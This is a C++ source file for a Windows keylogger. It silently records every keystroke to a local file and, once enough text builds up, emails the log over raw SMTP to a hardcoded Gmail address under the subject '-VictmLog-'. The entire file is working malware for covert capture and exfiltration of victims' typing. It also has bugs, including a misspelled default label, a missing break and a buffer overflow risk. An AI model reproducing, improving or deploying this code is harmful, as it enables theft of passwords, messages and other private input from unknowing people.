// keyloger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<stdio.h>
#include<windows.h>
#include <winsock.h>
#define KEY_PRESSED -32767
FILE *file;
int sendEmail(char *server,char *to,char *from,char *subject,char *message);


int main(int argc,char *argv[]){

	char key;
	int index;
	int length;
	char *buffer;
	file = fopen("key.txt","a+");
	if(file!=NULL)
	{
		while(true){
		Sleep(10);
		for(key=8;key<=255;key++)
		{
		file=fopen("key.txt","a+");
		if(GetAsyncKeyState(key)==KEY_PRESSED)
		{
			switch(key){
		case VK_SPACE:

		fprintf(file," ");
		break;
		case VK_SHIFT:
		fprintf(file,"\nshrift\n");
		break;
		case VK_RETURN:
		fprintf(file,"\n[enter]\n");
		break;
		case VK_BACK:
		fprintf(file,"\nVK_BACK:\n");
		case VK_CAPITAL:

		fprintf(file,"\nVK_CAPITAL\n");
		break;

		case VK_RBUTTON:
		fprintf(file,"\nVK_RBUTTON\n");
		break;

		case VK_LBUTTON:
		fprintf(file,"\nVK_LBUTTON\n");
		break;

		case 188:
		fprintf(file,",");
		break;
		case 190:
		fprintf(file,".");
		break;

		defaulte:
		fprintf(file,"%c",key);
		break;
		}
		fclose(file);
		}
		}
		file=fopen("key.txt","rb");
		fseek(file,0,SEEK_END);
		length=ftell(file);
		if(length>=60)
		{
		fseek(file,0,SEEK_SET);
		buffer=(char*)malloc(length);
		index=fread(buffer,1,length,file);
		buffer[index]='\0';
		sendEmail("gmail-smtp-in.l.google.com","vaxoalavidze97@gmail.com","vaxoalavidze97@gmail.com",(char*)"-VictmLog-",buffer);
		fclose(file);
		file=fopen("key.txt","w");
		}
		fclose(file);
		}

		}
	
	return 0;
}


	int sendEmail(char *server,char *to,char *from,char *subject,char *message)
	{
	SOCKET sockfd;
	WSADATA wsaData;
	hostent *host;
	sockaddr_in dest;
	int sent;
	char line[200];
	if(WSAStartup(0x202,&wsaData)!=SOCKET_ERROR){
	if((host = gethostbyname(server))!=NULL){
	memset(&dest,0,sizeof(dest));memcpy(&(dest.sin_addr),host->h_addr,host->h_length);
	
	dest.sin_family=host->h_addrtype;
	dest.sin_port=htons(25);
	sockfd=socket(AF_INET,SOCK_STREAM,0);

	connect(sockfd,(struct sockaddr*)&dest,sizeof(dest));

	strcpy(line,"hello me,dasdasd.com\n");
	sent=send(sockfd,line,strlen(line),0);
	Sleep(500);

	strcpy(line,"MAIL FROM:<");
	strncat(line,from,strlen(from));
	strncat(line,">\n",3);
	sent=send(sockfd,line,strlen(line),0);
	Sleep(500);



	strcpy(line,"MAIL TO:<");
	strncat(line,to,strlen(to));
	strncat(line,">\n",3);
	sent=send(sockfd,line,strlen(line),0);
	Sleep(500);


	strcpy(line,"DATA\n");
	sent = send(sockfd,line,strlen(line),0);
	Sleep(500);

	strcpy(line,"To:");
	strcat(line,to);
	strcat(line,"\n");
	strcat(line,"From");
	strcat(line,from);
	strcat(line,"\n");	
	strcat(line,"Subject:");
	strcat(line,(char*)subject);
	strcat(line,"\n");
	strcat(line,message);
	strcat(line,"\r\n.\r\n");
	sent=send(sockfd,line,strlen(line),0);
	Sleep(500);
	strcat(line,"quit\n");
	sent = send(sockfd,line,strlen(line),0);
	Sleep(500);
	}
	}
	closesocket(sockfd);
	WSACleanup();
	return 0;
}



